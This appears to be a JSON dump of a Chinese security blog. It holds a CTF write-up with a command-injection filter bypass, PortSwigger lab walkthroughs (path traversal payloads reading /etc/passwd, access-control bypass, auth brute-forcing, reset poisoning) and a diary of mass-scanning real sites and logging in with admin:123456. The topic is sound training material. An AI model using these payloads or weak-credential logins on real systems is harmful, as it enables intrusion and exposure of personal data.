base64.b64encode(c)# 将base64字符串写入Output.txt文件中print(a)print(encoded_data) 之后改Cookie即可 readbooks本题考点：命令执行 &#x2F;public&#x2F;book*发现同时列出来了book1和book2的内容 因此直接&#x2F;list&#x2F;*获取当前目录所有文件名 再用&#x2F;public&#x2F;black*获取黑名单，&#x2F;public&#x2F;app*获取源码 源码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import osfrom flask import Flask, request, render_templateapp = Flask(__name__)DISALLOWED1 = [&#x27;?&#x27;, &#x27;../&#x27;, &#x27;/&#x27;, &#x27;;&#x27;, &#x27;!&#x27;, &#x27;@&#x27;, &#x27;#&#x27;, &#x27;^&#x27;, &#x27;&amp;&#x27;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;=&#x27;, &#x27;+&#x27;]DISALLOWED_FILES = [&#x27;app.py&#x27;, &#x27;templates&#x27;, &#x27;etc&#x27;, &#x27;flag&#x27;, &#x27;blacklist&#x27;]BLACKLIST = [x[:-1] for x in open(&quot;./blacklist.txt&quot;).readlines()][:-1]BLACKLIST.append(&quot;/&quot;)BLACKLIST.append(&quot;\\\\&quot;)BLACKLIST.append(&quot; &quot;)BLACKLIST.append(&quot;\\t&quot;)BLACKLIST.append(&quot;\\n&quot;)BLACKLIST.append(&quot;tc&quot;)ALLOW = [ &quot;&#123;&quot;, &quot;&#125;&quot;, &quot;[&quot;, &quot;pwd&quot;, &quot;-&quot;, &quot;_&quot;]for a in ALLOW: try: BLACKLIST.remove(a) except ValueError: pass@app.route(&#x27;/&#x27;)@app.route(&#x27;/index&#x27;)def hello_world(): return render_template(&#x27;index.html&#x27;)@app.route(&#x27;/public/&lt;path:name&gt;&#x27;)def readbook(name): name = str(name) for i in DISALLOWED1: if i in name: return &quot;banned!&quot; for j in DISALLOWED_FILES: if j in name: return &quot;banned!&quot; for k in BLACKLIST: if k in name: return &quot;banned!&quot; print(name) try: res = os.popen(&#x27;cat &#123;&#125;&#x27;.format(name)).read() return res except: return &quot;error&quot;@app.route(&#x27;/list/&lt;path:name&gt;&#x27;)def listbook(name): name = str(name) for i in DISALLOWED1: if i in name: return &quot;banned!&quot; for j in DISALLOWED_FILES: if j in name: return &quot;banned!&quot; for k in BLACKLIST: if k in name: return &quot;banned!&quot; print(name) cmd = &#x27;ls &#123;&#125;&#x27;.format(name) try: res = os.popen(cmd).read() return res except: return &quot;error&quot;if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;,port=8878) 黑名单过滤了许多，因此需要绕过 空格用$IFS$9代替，关键字使用&#39;&#39;绕过，执行的命令进行base64转换 payload: &#x2F;public&#x2F;$IFS$9`ec’’ho$IFS$9Lyo|ba’’se64$IFS$9-d` 读取根目录下所有文件 King本题参考beginCTF 2024 Web方向题解WP 全-CSDN博客","categories":[],"tags":[]},{"title":"记一次简单的公益SRC挖掘","slug":"记一次简单的公益SRC挖掘","date":"2024-02-05T12:51:02.491Z","updated":"2024-02-05T15:44:11.021Z","comments":true,"path":"2024/02/05/记一次简单的公益SRC挖掘/","link":"","permalink":"http://example.com/2024/02/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98/","excerpt":"作者：Narcher 时间：2024&#x2F;2&#x2F;5 分类：diary","text":"作者：Narcher 时间：2024&#x2F;2&#x2F;5 分类：diary 前言​ 开头吐槽一下，本来想批量挖thinkphp框架漏洞的，但试了一试发现行不通（挖不出来），甚至我在查资产的时候查到了黄色网站！！！于是在郁闷之际随便搞，看见一个网站就搞一个，准备碰碰运气，结果还真让我碰到一个弱口令漏洞，下面讲一讲具体过程。 ​ 这事还要从半个月前说起… ​ Smgg之前接了个活，让我们写一下ZoomEye的实战心得。实战心得嘛，肯定得挖出来点东西。作为一个没挖过洞的runoob，只能到时候现学现卖了，本来打算过两天去学的。但我忙着打BeginCTF去了，于是就忘了。 ​ 直到昨天，BeginCTF打的差不多了，WP也写完了，刚想起这么个事，于是便赶鸭子上架，学了一下大佬们的相关思路，开始实战！！！ 昨日收获​ 昨日，我复现了一篇大佬写的挖掘《用友U8-OA》的SQL注入漏洞的具体流程来作为练习。（特附上大佬的文章：Fofa搜索语法批量挖掘sql注入漏洞 - 知乎 (zhihu.com)） ​ 既然已经确定了想要挖掘的漏洞，首先利用ZoomEye进行信息搜集。 ​ （保险起见，给关键信息打码处理） 之后点击右侧的下载导出所有的信息。 为了进行简单的对比，我还在Fofa上搜集了相同的信息并导出。 之后便是批量处理，写个脚本即可，直接拿大佬的过来用也行。 最终收获了8个有漏洞的网站，但有几个能交上完全是未知数。。。。。。 12345PS:同时，作为昨日使用ZoomEye的心得，在此总结一下：1.ZoomEye确实挺好用的，和Fofa比起来也算是各有千秋，搜集信息的时候最好使用二者都搜一下，互相补足2.ZoomEye搜索子域名是一把好手 今日收获​ 今天本来想和昨天类似，整一个thinkphp的批量挖掘来练练手，结果就碰上了“前言”里写的那些poshi，但总之也是有收获的嘛。下面具体讲一下思路。 ​ 还是一如既往的搜集信息： ​ 本来是打算批量刷的，然而就在此时，我脑回路一抽，突然想着手打。可打着打着发现菜的一个也打不通，于是便玉玉地打弱口令，刚试了第一个，就成了。那么好运？？？ ​ 结果进去一看，是个空的，啥也没有，那弱口令自然也就没用了。后面仔细看了一下，感觉这个好像不是什么企业的，顶多是个人拿来玩的个IP。 ​ 不过也算是个开门红，之后本着试一试的心态接着尝试了七八次。欸嘿，还真来了。 ​ 直接admin:123456登进去，发现还真是管理员权限，里边还有敏感信息。 算个中高危，交了，嘿嘿。 1PS:今日份总结：狗运当头~~~ 咳咳，以为这样就结束了？我本来也是这样认为的，写完日记准备收工，但奈何手痒，又想多刷几下，于是在刷了三四下之后还真又狗运刷到一个弱口令，这次还是个edu的，芜湖~~~ 再次账号：admin，密码：123456拿下，仍然具有管理员权限。 交到edusrc，收工！ 等等，这么好挖，收什么工！！！！继续挖！！！！ 没5分钟，又来一个。 源源不断，又又又来一个。这个更厉害，敏感信息泄露，包括姓名，手机号，身份证等。 ​ 之后又挖到一个小的，按道理应该算是某个团队搭建的论坛，算了，统统交上。。。 已经23点半了，今天马上结束了，今天的挖洞也真正的到此为止了。太爽啦！！！ 1PS：今日份总结：鸿运齐天！！！","categories":[],"tags":[]},{"title":"Burpsuite靶场--Access_control(后四道)","slug":"Burpsuite靶场--Access_control(后四道)","date":"2024-01-10T08:19:59.663Z","updated":"2024-01-26T02:53:33.396Z","comments":true,"path":"2024/01/10/Burpsuite靶场--Access_control(后四道)/","link":"","permalink":"http://example.com/2024/01/10/Burpsuite%E9%9D%B6%E5%9C%BA--Access_control(%E5%90%8E%E5%9B%9B%E9%81%93)/","excerpt":"作者：Narcher 时间：2023&#x2F;10&#x2F;18 分类：writeup","text":"作者：Narcher 时间：2023&#x2F;10&#x2F;18 分类：writeup URL-based access control can be circumvented此网站在&#x2F;admin处有一个未经身份验证的管理面板，但前端不可访问，后端支持X-Original-Url，因此我们可以点击admin后抓包，将GET访问的&#x2F;admin改成&#x2F;，添加X-Original-Url:/admin，发现成功。 再根据返回的前端提示修改为/admin/delete，并GET传参?usernmae&#x3D;carlos，即可成功。 Method-based access control can be circumvented登录administrator，进入Admin panel，选择carlos，点击Upgrade user，并抓包，send to Repeater。 再登录wiener，随便点击任意页面，抓包获取cookie。 将更改权限数据包中的cookie改成wiener的cookie。 请求方式改成POSTX，返回缺少参数，之后再更改请求方法为GET，修改username为wiener，发送（此时一定要处于wiener登录的状态），即可成功。 Multi-step process with no access control on one step登录administrator，进入Admin panel，选择carlos，点击Upgrade user，并抓包，send to Repeater。之后还有一个页面询问Are you sure？，点击yes，同时抓包发送到repeater。 之后登录wiener，随便抓一个包获取cookie，进入repeater，将两个包依次修改为wiener的cookie和姓名并发包，即可成功。 Referer-based access control登录administrator，进入Admin panel，选择carlos，点击Upgrade user，并抓包，send to Repeater。 之后登录wiener，随便抓一个包获取cookie，进入repeater，修改为wiener的cookie和姓名并发包，即可成功。 后两题考点： ​ （图源：http://t.csdnimg.cn/zrhTX，侵删）","categories":[],"tags":[]},{"title":"Burpsuite靶场--Path_Traversal","slug":"Burpsuite靶场--Path_Traversal","date":"2024-01-10T04:04:03.310Z","updated":"2024-01-26T02:56:30.426Z","comments":true,"path":"2024/01/10/Burpsuite靶场--Path_Traversal/","link":"","permalink":"http://example.com/2024/01/10/Burpsuite%E9%9D%B6%E5%9C%BA--Path_Traversal/","excerpt":"作者：Narcher 时间：2024&#x2F;1&#x2F;10 分类：writeup","text":"作者：Narcher 时间：2024&#x2F;1&#x2F;10 分类：writeup File path traversal, simple case随便打开一个博客，抓包，将?filename&#x3D;后的数据改成../../../../../etc/passwd即可。 File path traversal, traversal sequences blocked with absolute path bypass在这道题目中，..被禁用。因此我们无法使用相对路径../解题，仅能使用绝对路径/解题。 （在Linux系统中，文件路径是非常重要的。&#x2F;etc&#x2F;passwd和etc&#x2F;passwd看起来很相似，但实际上它们指向的是完全不同的位置。 /etc/passwd：这是一个绝对路径，它从文件系统的根目录/开始，指向etc目录下的passwd文件。这个文件存储了系统中所有用户的基本信息。 etc/passwd：这是一个相对路径，它从当前工作目录开始，指向当前目录下的etc子目录中的passwd文件。如果当前工作目录下没有etc子目录或者etc子目录中没有passwd文件，那么这个路径就无法正确地找到文件。） 因此，将?filename&#x3D;后的数据改成/etc/passwd即可。 File path traversal, traversal sequences stripped non-recursively非递归地剥离遍历序列时，使用....//或....\\/将其恢复成正常遍历序列。 将?filename&#x3D;后的数据改成....//....//....//etc/passwd即可。 File path traversal, traversal sequences stripped with superfluous URL-decode根据题目描述，本题需要通过url编码来绕过过滤，因此对..&#x2F;进行两次url编码。 将?filename&#x3D;后的数据改成%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66etc/passwd即可。 File path traversal, validation of start of path本题的目录遍历必须以预期的基文件开头即/var/www/images/，因此将?filename&#x3D;后的数据改成/var/www/images/../../../../etc/passwd即可。 File path traversal, validation of file extension with null byte bypass本题的目录遍历对文件名后缀的验证，因此我们可以使用%00截断。 将?filename&#x3D;后的数据改成../../../../../etc/passwd%00.jpg即可。","categories":[],"tags":[]},{"title":"Burpsuite靶场--Authentication","slug":"Burpsuite靶场--Authentication","date":"2023-12-03T14:37:29.364Z","updated":"2024-01-26T02:55:59.870Z","comments":true,"path":"2023/12/03/Burpsuite靶场--Authentication/","link":"","permalink":"http://example.com/2023/12/03/Burpsuite%E9%9D%B6%E5%9C%BA--Authentication/","excerpt":"作者：Narcher 时间：2023&#x2F;10&#x2F;18 分类：writeup","text":"作者：Narcher 时间：2023&#x2F;10&#x2F;18 分类：writeup Broken brute-force protection, IP block打开靶场，进入login界面，随便输入账号密码然后burp抓包，之后发送到Intruder模块，模式选择Pitchfork。 由于每错次个就会封ip，所以我们需要在需要爆破的用户名和密码中交替插入正确的用户名和密码，并保证一一对应。 利用notepad++的替换功能，制作字典。 密码字典同理。 之后分别在payload1和payload2导入字典，设置线程数为1，即可开始爆破。 设置筛选carlos 找到长度异常的请求，使用其payload1和payload2登录成功 Username enumeration via account lock本题重复登录5次就会锁定账号，所以把所有账号进行5次枚举，使用Intruder中的Cluster bomb 发现异常数据，猜测auth为用户名，故爆破其密码（虽然有锁定，但我们可以观察报错信息），选用Sniper 发现123456789为密码时报错信息长度异常，使用auth:123456789登录，成功 2FA broken logic先登录wiener:peter，在burp的target-map下找到此网站的login2 尝试将verify修改为我们要攻击的账号，故退出登录，重新登录wiener:peter，只是这次拦截login2，先放过第一个包，再拦截第二个包和第三个包并修改verify为carlos，完成之后发现还要输入验证码，根据登录wiener:peter的经验可知验证码是4位纯数字组合，因此我们直接爆破即可 得验证码为1657，之后输入验证码同时拦截包，将verify改为carlos，即可成功 Brute-forcing a stay-logged-in cookie首先根据现有凭据登录，并勾选stay logged in 登录之后发现存在stay-logged-in base64解密得:wiener:51dc30ddc473d43a6011e9ebba6ca770 后面的部分用MD5解密得到peter 于是我们先退出登录，之后对stay-logged-in进行爆破 需要设置好payload的处理方式，先对密码进行MD5加密，之后添加前缀carlos:，最后进行baes64加密，之后开始爆破 根据长度排序 Y2FybG9zOjlkZjNiMDFjNjBkZjIwZDEzODQzODQxZmYwZDQ0ODJj base64解密：carlos:9df3b01c60df20d13843841ff0d4482c MD5解密：access 成功 Offline password cracking首先利用现有凭据wiener:peter登录，之后去首页随便找一篇博客评论 之后去access log里找到stay-logged-in：Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz base64解密：carlos:26323c16d5f4dabff3bb136f2460a943 MD5解密：onceuponatime 之后删除carlos的账户即可成功 Password reset poisoning via middleware首先，点击忘记密码，输入carlos的用户名，点击submit后用burp拦截，在header位置添加X-Forwarded-Host并指向自己的服务器 之后去服务器的日志中查看发现获取到了carlos的token：3ek1baacsobkwf15q6sqjetimcb6atm8 之后登录wiener的账号并去获取wiener的邮箱账号，并填写在忘记密码页面的信息栏中 前往邮箱获取到重置密码的url，将token改为carlos的token并访问 修改好密码后在点击提交时拦截，将token改为carlos的token并发送 之后用修改后的密码登录carlos即可成功 Password brute-force via password change首先登录wiener:peter，之后通过修改密码查看返回信息 当原密码正确，新密码不一致时，提示New passwords do not match 当原密码错误，新密码不一致时，提示Current password is incorrect 因此我们可以使用新密码不一致来爆破原密码 载入字典，并设置好匹配关键字 爆破成功 之后使用carlos:654321登录即可完成 Broken brute-force protection, multiple credentials per request登录拦截，发现以json格式发送登录凭据 故将字典修改格式 之后以[数据块]的格式发送密码即可成功 2FA bypass using a brute-force attack先利用carlos:montoya进入验证码界面，随便输入验证码测试，发现输入两次错误验证码后会自动终止会话，但是，该用户并未被锁定，意味着我可以无限制地尝试。 如果每次尝试2FA会不断变化，我们没有办法爆破，但如果2FA在使用之前都一直有效，那么我们便可对其进行暴力破解。 登录过程涉及多个需要按顺序执行的请求，因此，我们可以使用宏，并尝试将这些请求合并到一个宏中。 操作步骤如下： &lt;1&gt;登录carlos:montoya &lt;2&gt;随便输入一个验证码，点击提交，报错 &lt;3&gt;进入burp，Project options的sessions，在Macro中选择如下的三个包，并Test macro正常 &lt;4&gt;进入session handling rules，点击Add，在 Scope的URL Scope中, 选择选项 Include all URLs；在Details中点击Add选择Run a marco，并将&lt;3&gt;中的marco加进去 &lt;5&gt;将POST &#x2F;login2发送给Intruder，将字典设置为0000-9999，线程数设为1，爆破验证码即可 (爆破速度超级慢，不建议尝试，等之后有时间再做吧)","categories":[],"tags":[]},{"title":"YulinSec-Recruit-2023-WP","slug":"YulinSec-Recruit-2023-WP","date":"2023-10-31T01:54:13.746Z","updated":"2024-07-26T03:02:40.713Z","comments":true,"path":"2023/10/31/YulinSec-Recruit-2023-WP/","link":"","permalink":"http://example.com/2023/10/31/YulinSec-Recruit-2023-WP/","excerpt":"作者：Narcher 时间：2023&#x2F;10&#x2F;18 分类：writeup","text":"作者：Narcher 时间：2023&#x2F;10&#x2F;18 分类：writeup 暂时关闭","categories":[],"tags":[]}],"categories":[],"tags":[]}